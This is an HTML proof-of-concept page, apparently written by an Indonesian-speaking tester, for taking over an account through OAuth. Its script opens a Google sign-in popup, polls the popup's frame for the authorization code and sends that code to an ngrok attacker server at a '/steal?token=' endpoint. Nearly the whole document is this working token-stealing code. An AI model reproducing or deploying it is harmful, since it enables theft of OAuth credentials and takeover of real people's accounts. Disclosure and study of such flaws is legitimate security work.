<!DOCTYPE html>
<html>
<head>
    <title>POC ATO FACEBOOK</title>
</head>
<body>
    <h1>POC - Takeover Facebook Account</h1>
    
    <a href="#" id="authLink">Klik disini untuk memulai proses otorisasi</a>
    
    <script>
        document.getElementById('authLink').onclick = function() {
            // Buka jendela popup untuk otorisasi OAuth
            var targetWindow = window.open("https://accounts.google.com/v3/signin/identifier?opparams=%253Fcred_ref%253Dtrue%2526hd%253D*&dsh=S2047203551%3A1722425107784051&client_id=138009452611-sjeieq88qlhfp7ti9t4aotqarhhb8erm.apps.googleusercontent.com&code_challenge=qCR37RuDthbz5kDFjKz7Eu-3AgWnup7HOzQQpYF5EKo&code_challenge_method=S256&ddm=0&hd=*&o2v=2&redirect_uri=https%3A%2F%2Fiap.googleapis.com%2Fv1%2Foauth%2FclientIds%2F138009452611-sjeieq88qlhfp7ti9t4aotqarhhb8erm.apps.googleusercontent.com%3AhandleRedirect&response_type=code&scope=openid+email&service=lso&state=AYSkYYoEiQYoAJUmNAHfMZFBFBlP8gJYL4Pm9Iaqq2ttyJouiqSa0xITU8zvRhoVouYyoT6DwL_zOYG-qicUKJQ58NOk1EpOzdyPYdRrRdRyLtzNqCCTCgMw_ambOHxBWWGkfcJDw9OQNXNXdbyEhpo70RWlTvRADuND4uPea5H-hSSBg-NRbMywL1S4KPLmpoVhkdSzzvJ8vvy6BPChSX6jgENzd2BAXOGmSyPqyxBusms7HmdfCRylDiDm4RBc9Mal6vSkhHmtDaWLQerZKVT8C5HoWFRmB0pv56_JcNBXPN4enIz8YKiuN-o6oSKextL7OcFX7QTtyqTjcpUh0oDbdfx40hN-GmN4KWUM8rmMJg-cHpQTZsOo8DPGd3Rf7eVv_trX5WOKCF63nZqkWos3NNnHKkLFw6WUIApfty1Spjv9vzvtDxCHcqD0g0CUT8hvIhNBUGCV8cemjQw7yqsEDvIgMqSngtrQUL3T2SbfvHUmXkTIrQ-dGJctv3EtyWc6g__VJBUBanDDgtxgJctOeUCGB8_aLU3HOxXv6PyUhXnJ7KxFI8PsDJZAxd8NTJ4RtE2v430ljatiUMb7WilntI_8wilBmlgUwAGQA199Bg7n_lp5Om_4uTC_hKjy3-iu8y7LuGHQqA9SMwKpsai3_L6lRwj6heEX8vD-DSZ_YYWGbRmtLT1nq_tm4bu91tQD2zSxxrPHzpW1a9nfgIoMhQgQyYPK1pz4KH-y8EGwAE3opFRN5cuVxHhd7mhg8_DmLu-3Glr_eqbWjJOwPl1J2dztf8toGVMqoP_v5eRLkcVe89wC51Wqyu8evxMyQddchU227kmHHhVBYnApHNEnpkvBJ-FFprXGDJnyjEGxOKD5krEQbsE7gMMN6-POp7Fn7CV3XuDn2dIFSGwYHf_D030xQq6GXr-sOJ-vNYkzXze4GnwNghIjgwCtifdB3U5SVSdvUcRe5Fhu6vNHRllOLg8P5J7u_mvWNqqiLtz_WqCBM46m-raXjzT4n1WYil-H7hrtB8vdctN5iz3zNUwo8bWdYZrA&flowName=GeneralOAuthFlow&continue=https%3A%2F%2Faccounts.google.com%2Fsignin%2Foauth%2Fconsent%3Fauthuser%3Dunknown%26part%3DAJi8hAPhziXPNg32_JVQalAAbTKaGnLvRJCXH8HbHk2uVeCxxvsSi_Gm1gwQoLGsUL13fb3-lSdbmwKV7AN7KfiFDUKitu5K32WO5wZGKHX07FA7a10MU9BsLBea5lUEsCAaSJCQlg_AsEAZR7-KMizpBHGrvgNUyn6TcbcaNd9F7zKsnmKlulFOznHvkmW0apPe35qlxTASiwG3qIbMxYT5iKWc2iK7a1mrn7bTa6C1MYvCvFnG3OUErjWweHk2iVbpw_IfwSdNuUITSX2r4OVO-Uwc3EE698xeVLbWJNp36zJlz65sYFMrr4AqZCkIAypF8wUK2Klqpg8XFLphO6tG2SicC41X1WwEhQuD2go0R9DH3XwuuW6uQnIRBojNqqaTfDoKdqab8xURXIBWKnLU-tlvH0_mqwSZ1E7pKvnCOnQQ25oRTYZNX4_InnAyExVigyon3fwxnBILTIApkay6tgPsPHUwqQ%26flowName%3DGeneralOAuthFlow%26as%3DS2047203551%253A1722425107784051%26client_id%3D138009452611-sjeieq88qlhfp7ti9t4aotqarhhb8erm.apps.googleusercontent.com%23&app_domain=https%3A%2F%2Fiap.googleapis.com&rart=ANgoxcdoDqg08pcMDI1rJWSdzYzx1_CG1EDpt-3Q9L2kRz9Dgr7sMZ7btOqWBsh4Oi5b5Bu2J3ytnX5QxRpBvZVcdB2D_LMK9XpOTXubov6-1zsRJ6YHj9Q");

            // Tunggu dan ambil kode OAuth dari jendela popup
            var checkPopup = setInterval(function() {
                try {
                    // Periksa apakah jendela popup sudah ditutup
                    if (targetWindow.closed) {
                        clearInterval(checkPopup);
                        console.log("Popup closed");
                        return;
                    }
                    
                    // Coba akses URL dari iframe di jendela popup
                    var iframeUrl = targetWindow.frames[0].location.href;
                    console.log("Iframe URL:", iframeUrl);

                    // Ekstrak kode OAuth dari URL
                    var urlParams = new URLSearchParams(new URL(iframeUrl).search);
                    var oauthCode = urlParams.get('code');
                    if (oauthCode) {
                        console.log("OAuth Code:", oauthCode);
                        // Kirim kode ke server penyerang
                        var xhr = new XMLHttpRequest();
                        xhr.open("GET", "https://bd72-36-73-33-194.ngrok-free.app/steal?token=" + encodeURIComponent(oauthCode), true);
                        xhr.send();
                    }
                } catch (e) {
                    // Tangani kesalahan, biasanya karena pelanggaran SOP
                    console.log("Error accessing iframe URL:", e);
                }
            }, 1000); // Periksa setiap detik
        };
    </script>
</body>
</html>
